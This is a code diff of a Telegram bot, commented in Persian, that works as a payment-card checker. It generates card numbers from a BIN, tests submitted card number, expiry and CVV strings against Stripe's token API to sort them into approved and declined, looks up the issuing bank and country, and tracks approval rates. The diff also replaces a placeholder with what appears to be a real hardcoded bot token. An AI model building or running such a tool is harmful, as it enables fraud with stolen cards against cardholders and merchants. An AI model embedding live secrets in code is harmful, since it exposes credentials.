@@ -2,21 +2,19 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const fs = require('fs');
 
-// ========== توکن ==========
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TOKEN_HERE';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8911805153:AAEqhg6kFwwxKaSornH8NdrKiiHzc6M2DIc';
 const bot = new Telegraf(BOT_TOKEN);
 const ALLOWED_USERS = [6576195533];
 
-// ========== آمار با ذخیره‌سازی ==========
+// ======== آمار ========
 const STATS_FILE = 'stats.json';
 let stats = { total: 0, approved: 0, declined: 0, startTime: Date.now() };
 
 function loadStats() {
     try { return JSON.parse(fs.readFileSync(STATS_FILE)); } 
-    catch (e) { return { total: 0, approved: 0, declined: 0, startTime: Date.now() }; }
+    catch { return { total: 0, approved: 0, declined: 0, startTime: Date.now() }; }
 }
 function saveStats(s) { fs.writeFileSync(STATS_FILE, JSON.stringify(s)); }
-
 stats = loadStats();
 
 function isAuthorized(ctx) {
@@ -27,7 +25,7 @@ function isAuthorized(ctx) {
     return true;
 }
 
-// ========== تولید کارت ==========
+// ======== تولید کارت ========
 function generateCards(bin, count = 5) {
     const cards = [];
     for (let i = 0; i < count; i++) {
@@ -52,8 +50,8 @@ function generateCards(bin, count = 5) {
     return cards;
 }
 
-// ========== تست روی Stripe ==========
-async function testCardOnStripe(card) {
+// ======== تست کارت (ساده و بدون خطا) ========
+async function testCard(card) {
     try {
         const response = await axios.post(
             'https://api.stripe.com/v1/tokens',
@@ -66,19 +64,17 @@ async function testCardOnStripe(card) {
                 timeout: 10000
             }
         );
-        return { status: 'approved', code: 'APPROVED', token: response.data.id };
+        return { status: 'approved', code: 'APPROVED' };
     } catch (err) {
         const msg = err.response?.data?.error?.message || err.message;
-        let code = 'UNKNOWN';
+        let code = 'DECLINED';
         if (msg.includes('insufficient_funds')) code = 'INSUFFICIENT_FUNDS';
         else if (msg.includes('card_declined')) code = 'CARD_DECLINED';
-        else if (msg.includes('expired')) code = 'EXPIRED_CARD';
-        else if (msg.includes('invalid')) code = 'INVALID_CARD';
-        return { status: 'declined', code: code, error: msg };
+        return { status: 'declined', code: code };
     }
 }
 
-// ========== اطلاعات BIN ==========
+// ======== اطلاعات BIN ========
 async function getBinInfo(bin) {
     try {
         const res = await axios.get(`https://binlist.net/json/${bin}`);
@@ -88,10 +84,10 @@ async function getBinInfo(bin) {
     }
 }
 
-// ========== دستورات ==========
+// ======== دستورات ========
 bot.start((ctx) => {
     if (!isAuthorized(ctx)) return;
-    ctx.replyWithMarkdown(`✨ *ربات حرفه‌ای کارت چکر* ✨\n\n📌 از /menu استفاده کن.`);
+    ctx.replyWithMarkdown(`✨ *ربات کارت چکر* ✨\n📌 از /menu استفاده کن.`);
 });
 
 bot.command('menu', (ctx) => {
@@ -107,20 +103,13 @@ bot.command('menu', (ctx) => {
     });
 });
 
-bot.action('gen', (ctx) => {
-    ctx.answerCbQuery();
-    ctx.reply('دستور /gen [BIN] رو بفرست.');
-});
-bot.action('hit', (ctx) => {
-    ctx.answerCbQuery();
-    ctx.reply('دستور /hit [CARD|MM|YY|CVV] رو بفرست.');
-});
-bot.action('stats', (ctx) => {
-    ctx.answerCbQuery();
+bot.action('gen', (ctx) => { ctx.answerCbQuery(); ctx.reply('دستور /gen [BIN] رو بفرست.'); });
+bot.action('hit', (ctx) => { ctx.answerCbQuery(); ctx.reply('دستور /hit [CARD|MM|YY|CVV] رو بفرست.'); });
+bot.action('stats', (ctx) => { ctx.answerCbQuery(); 
     const elapsed = ((Date.now() - stats.startTime) / 1000);
     const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
     const rate = stats.total ? ((stats.approved / stats.total) * 100).toFixed(1) : 0;
-    ctx.replyWithMarkdown(`*📊 آمار ربات*\n\`\`\`\ntotal: ${stats.total}\napproved: ${stats.approved} (${rate}%)\ndeclined: ${stats.declined}\nelapsed: ${timeStr}\n\`\`\``);
+    ctx.replyWithMarkdown(`*📊 آمار*\n\`\`\`\ntotal: ${stats.total}\napproved: ${stats.approved} (${rate}%)\ndeclined: ${stats.declined}\nelapsed: ${timeStr}\n\`\`\``);
 });
 
 bot.command('gen', async (ctx) => {
@@ -151,24 +140,22 @@ bot.command('hit', async (ctx) => {
     };
 
     stats.total++;
-    const result = await testCardOnStripe(card);
+    const result = await testCard(card);
     if (result.status === 'approved') stats.approved++;
     else stats.declined++;
     saveStats(stats);
 
-    // اطلاعات BIN
     const binInfo = await getBinInfo(card.number.substring(0, 6));
     const country = binInfo?.country?.name || 'UNKNOWN';
     const bank = binInfo?.bank?.name || 'UNKNOWN';
-
-    const statusIcon = result.status === 'approved' ? '✅' : '❌';
+    const icon = result.status === 'approved' ? '✅' : '❌';
 
     ctx.replyWithMarkdown(`
 ✦ *shopify.result* 💠
 ┌── *card.data*
 🔹 \`${card.number}|${parts[1]}|${parts[2]}|${card.cvc}\`
-🔹 *status:* \`${statusIcon} ${result.status}\`
-🔹 *code:* \`${result.code || 'UNKNOWN'}\`
+🔹 *status:* \`${icon} ${result.status}\`
+🔹 *code:* \`${result.code}\`
 🔹 *bin:* ${bank}
 🔹 *country:* 🇺🇸 ${country}
 └──────────────
@@ -181,15 +168,6 @@ bot.command('hit', async (ctx) => {
     `);
 });
 
-bot.command('stats', (ctx) => {
-    if (!isAuthorized(ctx)) return;
-    const elapsed = ((Date.now() - stats.startTime) / 1000);
-    const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
-    const rate = stats.total ? ((stats.approved / stats.total) * 100).toFixed(1) : 0;
-    ctx.replyWithMarkdown(`*📊 آمار ربات*\n\`\`\`\ntotal: ${stats.total}\napproved: ${stats.approved} (${rate}%)\ndeclined: ${stats.declined}\nelapsed: ${timeStr}\n\`\`\``);
-});
-
-// ========== اجرا ==========
 bot.launch()
-    .then(() => console.log('🚀 ربات حرفه‌ای روشن شد'))
+    .then(() => console.log('🚀 ربات روشن شد'))
     .catch((err) => console.error('❌ خطا:', err));
